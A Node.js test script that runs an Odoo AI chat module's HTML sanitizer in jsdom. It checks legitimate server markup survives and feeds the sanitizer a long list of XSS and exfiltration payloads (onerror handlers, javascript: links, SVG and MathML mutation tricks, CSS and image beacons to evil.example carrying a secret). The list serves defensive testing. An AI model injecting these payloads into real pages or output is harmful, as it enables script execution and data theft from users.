/* SPDX-License-Identifier: Apache-2.0 */
/* Copyright (C) 2025-2026 Patanegra Soft <https://patanegra.com> */
/**
 * Runs both chatboo_formatters.js (owl1, owl2) in jsdom against assistant
 * HTML that tries to run code or call out, and against server HTML that
 * must survive. Prints a JSON list of failures; empty list = pass.
 *
 * usage: node sanitize_html_corpus.js <module_root>
 */
const fs = require('fs');
const path = require('path');
const { JSDOM } = require('jsdom');

const ROOT = process.argv[2];
const JS = (stack) => path.join(ROOT, 'stacks', stack, 'pns_ai_chatboo', 'static', 'src', 'js');
const MARKDOWN = fs.readFileSync(path.join(ROOT, 'common', 'static', 'src', 'js', 'chatboo_markdown.js'), 'utf8');

function windowFor() {
    const dom = new JSDOM('<!doctype html><body></body>', {
        url: 'https://odoo.example/web', runScripts: 'outside-only',
    });
    dom.window.eval(MARKDOWN);
    return dom.window;
}

function loadOwl1() {
    const w = windowFor();
    w.eval('var __mod; var odoo = { define: function (n, f) { __mod = f(function () { return { _t: function (s) { return s; } }; }); } };');
    w.eval(fs.readFileSync(path.join(JS('owl1'), 'chatboo_formatters.js'), 'utf8'));
    return { w, f: w.__mod };
}

function loadOwl2() {
    const w = windowFor();
    let src = fs.readFileSync(path.join(JS('owl2'), 'chatboo_formatters.js'), 'utf8');
    src = src.replace(/import \{ _t \} from "@web\/core\/l10n\/translation";/, 'var _t = function (s) { return s; };');
    src = src.replace(/import \{ session \} from "@web\/session";/, 'var session = { user_context: {} };');
    src = src.replace(/export \{([\s\S]*?)\};/, 'window.__mod = {$1};');
    w.eval(src);
    return { w, f: w.__mod };
}

const ATTACKS = [
    '<img src=x onerror=alert(1)>',
    '<img src="https://evil.example/p.png?d=SECRET" alt="logo">',
    '![x](https://evil.example/a.png?q=SECRET)',
    'Mira esto: <img src="//evil.example/p.gif?d=1">',
    '<a href="javascript:alert(1)">x</a>',
    '<a href=" jav&#x09;ascript:alert(1)">x</a>',
    'Ver **esto**: [clic](javascript:alert(1)) y ![p](https://evil.example/m.png)',
    '<div><a href="https://ok.example"><img src="https://evil.example/q.png" alt="z"></a></div>',
    '<svg><script>alert(1)</script></svg>',
    '<svg onload=alert(1)><circle r="2"/></svg>',
    '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
    '<svg><animate attributeName="href" to="javascript:alert(1)"/></svg>',
    '<svg><image href="https://evil.example/i.png"/></svg>',
    '<svg><use href="https://evil.example/s.svg#a"/></svg>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<object data="https://evil.example/x"></object><embed src="https://evil.example/x">',
    '<form action="https://evil.example"><button formaction="https://evil.example">x</button></form>',
    '<meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/">',
    '<link rel="stylesheet" href="https://evil.example/c.css"><style>@import url(https://evil.example/c.css)</style>',
    '<div style="background:url(https://evil.example/x?d=1)">a</div>',
    '<div style="background-image:image-set(\'https://evil.example/x\' 1x)">a</div>',
    '<div style="background:u\\72l(https://evil.example/x)">a</div>',
    '<div style="background:url(https://evil.example/x">a</div>',
    '<svg><rect fill="url(https://evil.example/x.svg#a)"/></svg>',
    '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
    '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
    '<div class="card"><details open ontoggle=alert(1)>x</details></div>',
    '<video poster="https://evil.example/p.png"><source src="https://evil.example/v.mp4"></video>',
    '<table><tr><td background="https://evil.example/b.png">x</td></tr></table>',
    '<img srcset="https://evil.example/a.png 1x" src="/web/image/x">',
    '<unknown onclick=alert(1)>x</unknown>',
    '<div foo="javascript:alert(1)" bar="https://evil.example/x">x</div>',
    '<marquee onstart=alert(1)>x</marquee>',
    '<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>',
    '<custom-xss><img src=x onerror=alert(1)></custom-xss>',
];

const RUNS_CODE = [
    /\son[a-z]+\s*=/i, /=\s*["']?\s*javascript:/i, /<script/i, /<iframe/i, /<object/i,
    /<embed/i, /<form/i, /<meta/i, /<base/i, /<link/i, /<style/i, /<animate/i,
];

const REMOTE_IMAGE = '/pns_ai_mcp/remote_image?url=';

/**
 * An attribute that makes the browser fetch from another origin by itself.
 * An <img> asked of our own remote_image route is not: Odoo applies the URL policy.
 * alt / title are text, never fetched.
 */
function callsOut(out, w) {
    const box = w.document.implementation.createHTMLDocument('').createElement('div');
    box.innerHTML = out;
    for (const el of box.querySelectorAll('*')) {
        for (const a of el.attributes) {
            if (a.name.toLowerCase() === 'href' && el.nodeName.toUpperCase() === 'A') {
                continue;
            }
            if (a.name.toLowerCase() === 'alt' || a.name.toLowerCase() === 'title') {
                continue;
            }
            if (a.name.toLowerCase() === 'src' && el.nodeName.toUpperCase() === 'IMG'
                && a.value.indexOf(REMOTE_IMAGE) === 0) {
                continue;
            }
            if (/evil\.example/.test(a.value)) {
                return el.nodeName + '[' + a.name + ']';
            }
        }
    }
    return null;
}

const SURVIVES = [
    ['server table', '<div class="o_ai_table_block" data-ai-dataset="ds1"><table class="o_ai_data_table"><tr><td><a href="/web#id=5&amp;model=res.partner">A</a></td></tr></table></div>',
        (o) => /data-ai-dataset="ds1"/.test(o) && /o_ai_data_table/.test(o) && /href="\/web#id=5&amp;model=res.partner"/.test(o)],
    ['copy button', '<div class="o_ai_table_block"><button type="button" class="o_ai_cell_copy o_ai_noexport" data-copy="x">c</button></div>',
        (o) => /<button type="button" class="o_ai_cell_copy o_ai_noexport" data-copy="x">/.test(o)],
    ['data: image', '<div><img src="data:image/png;base64,AAAA" alt="map"></div>',
        (o) => /<img src="data:image\/png;base64,AAAA"/.test(o)],
    ['own image', '<div><img src="/web/image/res.partner/5/image_128"></div>',
        (o) => /<img src="\/web\/image\/res.partner\/5\/image_128"/.test(o) && /href="\/web\/image\/res.partner\/5\/image_1920"/.test(o)],
    ['svg gradient', '<div class="card"><svg viewBox="0 0 10 10"><defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs><rect fill="url(#g)" width="10" height="10"/></svg></div>',
        (o) => /fill="url\(#g\)"/.test(o) && /<linearGradient id="g">/i.test(o)],
    ['inline style', '<div style="color: red; font-weight: bold">x</div>',
        (o) => /style="color: red; font-weight: bold"/.test(o)],
    ['markdown', '**bold** and [Odoo](https://odoo.com) and `code`',
        (o) => /<strong>bold<\/strong>/.test(o) && /href="https:\/\/odoo.com"/.test(o) && /noopener/.test(o)],
    ['plain text', 'Hello, 3 < 5 and 7 > 2', (o) => /3 &lt; 5/.test(o)],
    ['mailto', '<div><a href="mailto:a@b.c">a</a></div>', (o) => /href="mailto:a@b.c"/.test(o)],
    ['snake_case', 'See **res_partner** and `account_move`',
        (o) => /<strong>res_partner<\/strong>/.test(o) && /account_move/.test(o) && !/<em>/.test(o)],
    ['external image is asked of Odoo', '<img src="https://evil.example/p.png" alt="logo">',
        (o) => /<a href="https:\/\/evil.example\/p.png" target="_blank" rel="noopener noreferrer"><img src="\/pns_ai_mcp\/remote_image\?url=https%3A%2F%2Fevil.example%2Fp.png" alt="logo"><\/a>/.test(o)],
    ['external image without alt shows its address if refused', '<a href="https://ok.example/p"><img src="https://evil.example/q.png"></a>',
        (o) => /<a href="https:\/\/ok.example\/p"[^>]*><img src="\/pns_ai_mcp\/remote_image\?url=[^"]+" alt="https:\/\/evil.example\/q.png"><\/a>/.test(o)],
];

const failures = [];
for (const [stack, load] of [['owl1', loadOwl1], ['owl2', loadOwl2]]) {
    const { w, f } = load();
    for (const payload of ATTACKS) {
        for (const [fn, out] of [['formatContent', f.formatContent(payload)], ['sanitizeHtml', f.sanitizeHtml(payload)]]) {
            const hit = RUNS_CODE.find((re) => re.test(out));
            const leak = callsOut(out, w);
            if (hit || leak) {
                failures.push({ stack, fn, payload, out, why: String(hit || leak) });
            }
        }
    }
    for (const [name, src, ok] of SURVIVES) {
        const out = f.formatContent(src);
        if (!ok(out)) {
            failures.push({ stack, fn: 'formatContent', payload: name, out, why: 'legit HTML changed' });
        }
    }
    const text = f.textOfHtml('<p>Hola <img src=x onerror=alert(1)>mundo</p>');
    if (text !== 'Hola mundo') {
        failures.push({ stack, fn: 'textOfHtml', payload: 'img', out: text, why: 'text' });
    }
}
process.stdout.write(JSON.stringify(failures));
